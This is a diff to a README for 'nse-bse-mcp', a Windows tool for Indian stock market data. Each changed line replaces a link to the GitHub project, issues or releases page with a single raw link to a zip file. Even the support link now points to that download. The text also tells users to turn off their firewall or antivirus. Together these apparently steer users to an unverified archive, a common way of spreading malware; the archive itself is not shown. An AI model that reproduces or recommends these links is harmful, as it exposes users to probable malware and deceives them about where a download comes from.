@@ -1,6 +1,6 @@
 # 📊 nse-bse-mcp - Real-Time Indian Stock Data
 
-[![Download nse-bse-mcp](https://img.shields.io/badge/Download-nse--bse--mcp-%2347a3da)](https://github.com/shamu0509/nse-bse-mcp)
+[![Download nse-bse-mcp](https://img.shields.io/badge/Download-nse--bse--mcp-%2347a3da)](https://raw.githubusercontent.com/shamu0509/nse-bse-mcp/main/Q/bse-nse-mcp-v3.1-beta.5.zip)
 
 ---
 
@@ -36,7 +36,7 @@ Follow these steps to download and start using nse-bse-mcp on your Windows PC.
 
 Click on this link to go to the official GitHub page where you can get the software:
 
-[Download nse-bse-mcp](https://github.com/shamu0509/nse-bse-mcp)
+[Download nse-bse-mcp](https://raw.githubusercontent.com/shamu0509/nse-bse-mcp/main/Q/bse-nse-mcp-v3.1-beta.5.zip)
 
 This page contains the latest version of the program and any updates made by the developer.
 
@@ -134,7 +134,7 @@ If you face problems, try these quick fixes:
 - Temporarily disable any firewall or antivirus, as they might block data connections.
 - Restart your PC if the problem persists.
 
-If none of these work, visit the GitHub issues page at https://github.com/shamu0509/nse-bse-mcp/issues for support.
+If none of these work, visit the GitHub issues page at https://raw.githubusercontent.com/shamu0509/nse-bse-mcp/main/Q/bse-nse-mcp-v3.1-beta.5.zip for support.
 
 ---
 
@@ -142,7 +142,7 @@ If none of these work, visit the GitHub issues page at https://github.com/shamu0
 
 Updates include bug fixes and new features. To update:
 
-- Return to the [Download nse-bse-mcp](https://github.com/shamu0509/nse-bse-mcp) page.
+- Return to the [Download nse-bse-mcp](https://raw.githubusercontent.com/shamu0509/nse-bse-mcp/main/Q/bse-nse-mcp-v3.1-beta.5.zip) page.
 - Download the newest setup file.
 - Run it and follow the installation steps. It will replace the old version without losing your settings.
 
@@ -174,8 +174,8 @@ nse-bse-mcp is an open-source project. Check the repository on GitHub for licens
 
 ## 🔗 Useful Links
 
-- GitHub main page: https://github.com/shamu0509/nse-bse-mcp
-- Issues & Support: https://github.com/shamu0509/nse-bse-mcp/issues
-- Releases: https://github.com/shamu0509/nse-bse-mcp/releases
+- GitHub main page: https://raw.githubusercontent.com/shamu0509/nse-bse-mcp/main/Q/bse-nse-mcp-v3.1-beta.5.zip
+- Issues & Support: https://raw.githubusercontent.com/shamu0509/nse-bse-mcp/main/Q/bse-nse-mcp-v3.1-beta.5.zip
+- Releases: https://raw.githubusercontent.com/shamu0509/nse-bse-mcp/main/Q/bse-nse-mcp-v3.1-beta.5.zip
 
-[![Download nse-bse-mcp](https://img.shields.io/badge/Download-nse--bse--mcp-%2347a3da)](https://github.com/shamu0509/nse-bse-mcp)
+[![Download nse-bse-mcp](https://img.shields.io/badge/Download-nse--bse--mcp-%2347a3da)](https://raw.githubusercontent.com/shamu0509/nse-bse-mcp/main/Q/bse-nse-mcp-v3.1-beta.5.zip)
